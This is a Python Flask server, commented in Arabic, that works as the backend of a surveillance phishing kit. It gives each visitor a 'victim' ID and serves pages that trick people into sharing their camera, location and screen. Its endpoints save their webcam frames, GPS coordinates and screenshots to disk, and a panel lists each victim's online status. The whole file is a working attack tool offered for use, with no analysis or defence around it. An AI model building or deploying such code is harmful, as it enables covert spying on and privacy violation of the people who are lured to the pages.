from flask import Flask, request, jsonify, render_template
import os
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)

victims = {}
geo_data = {}
screen_frames = {}

# لتخزين آخر وقت تواصل لكل ضحية
last_seen = {}

def update_last_seen(victim_id):
    last_seen[victim_id] = datetime.utcnow()

# صفحة البداية لتسجيل الضحية
@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    victims[victim_id] = {}
    update_last_seen(victim_id)
    return render_template("index.html", victim_id=victim_id)

# صفحة الكاميرا
@app.route("/camera.html")
def camera_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("camera.html", victim_id=victim_id)

# صفحة تحديد الموقع
@app.route("/geo.html")
def geo_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("geo.html", victim_id=victim_id)

# صفحة مشاركة الشاشة
@app.route("/screenshare.html")
def screenshare_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("screenshare.html", victim_id=victim_id)

# استقبال صور الكاميرا
@app.route("/api/camera_frame", methods=["POST"])
def api_camera_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)

    frame = request.data
    if not os.path.exists("camera"):
        os.makedirs("camera")

    file_path = os.path.join("camera", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    print(f"[CAMERA] Frame saved for Victim {victim_id}")
    return jsonify({"status": "ok"})

# استقبال بيانات الموقع
@app.route("/api/geo", methods=["POST"])
def api_geo():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)

    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")

    geo_data[victim_id] = {"lat": lat, "lon": lon}
    print(f"[GEO] Victim {victim_id} => Lat: {lat}, Lon: {lon}")

    return jsonify({"status": "ok"})

# استقبال لقطات الشاشة
@app.route("/api/screen_frame", methods=["POST"])
def api_screen_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    update_last_seen(victim_id)

    frame = request.data
    if not os.path.exists("screens"):
        os.makedirs("screens")

    file_path = os.path.join("screens", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    screen_frames[victim_id] = file_path
    print(f"[SCREEN] Frame saved for Victim {victim_id}")

    return jsonify({"status": "ok"})

# مسار عرض الضحايا وحالتهم
@app.route("/api/victims", methods=["GET"])
def api_victims():
    result = []
    now = datetime.utcnow()

    for victim_id in victims.keys():
        seen = last_seen.get(victim_id)
        status = "Offline"
        last_seen_str = None
        if seen:
            diff = now - seen
            if diff < timedelta(minutes=5):  # يعتبر Online إذا تواصل خلال 5 دقائق
                status = "Online"
            last_seen_str = seen.strftime("%Y-%m-%d %H:%M:%S UTC")

        result.append({
            "id": victim_id,
            "status": status,
            "last_seen": last_seen_str
        })

    return jsonify(result)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
